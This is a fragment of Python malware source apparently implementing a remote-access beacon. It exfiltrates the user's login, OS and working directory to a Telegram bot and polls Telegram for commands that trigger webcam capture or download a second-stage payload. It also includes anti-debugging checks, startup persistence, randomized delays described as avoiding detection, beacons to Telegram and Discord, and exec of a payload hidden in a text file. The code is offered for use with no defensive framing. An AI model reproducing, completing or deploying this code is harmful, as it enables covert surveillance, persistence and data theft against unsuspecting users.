# --- Auto Exfiltration ---
def auto_exfil():
    """Automatic system information exfiltration"""
    try:
        info = f"User: {os.getlogin()}\nOS: {os.name}\nPath: {os.getcwd()}\nTime: {time.ctime()}"
        send_telegram(info)
    except Exception as e:
        send_telegram(f"Exfil error: {str(e)}")

# --- Smart Delay ---
def get_smart_delay():
    """Randomized delay to simulate human behavior / avoid detection"""
    return random.randint(300, 900)  # 5-15 minutes

# --- Command Polling ---
def check_commands():
    """Check Telegram for commands like !webcam or !stage2"""
    try:
        updates = http_client.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates", timeout=10).json()
        for msg in updates.get("result", []):
            message_text = str(msg.get("message", {}).get("text", ""))
            if "!webcam" in message_text:
                send_telegram("Webcam command received")
                run_webcam_module()
            elif "!stage2" in message_text:
                send_telegram("Stage2 command received")
                fetch_stage2()
    except Exception as e:
        send_telegram(f"Command check error: {str(e)}")

# --- Main Execution ---
def main():
    # Anti-debugging
    if anti_debug_check():
        return

    # Persistence
    add_to_startup()

    # Initial beacon
    send_telegram(f"🟢 Beacon activated - User: {os.getlogin()}")
    send_discord(f"✅ Beacon from {os.getlogin()}")

    # Conditional auto-exfil
    if random.random() < 0.3:
        auto_exfil()
        time.sleep(random.randint(30, 120))

    # Try hidden payload
    payload = extract_hidden_payload("Holisticgroup.txt")
    if payload:
        send_telegram("Executing hidden payload")
        try:
            exec(payload, {'__builtins__': {'exec': exec, 'print': lambda x: None, '__import__': __import__}})
        except Exception as e:
            send_telegram(f"Payload execution failed: {str(e)}")
    else:
        # Fallback: stage2
        if random.random() < 0.1:
            fetch_stage2()

    # Poll for commands
    check_commands()

    # Wait before next cycle
    time.sleep(get_smart_delay())

# --- Persistent Beacon Loop ---
if __name__ == "__main__":
    while True:
        try:
            main()
        except KeyboardInterrupt:
            break
        except Exception as e:
            send_telegram(f"Main loop error: {str(e)}")
            time.sleep(get_smart_delay())
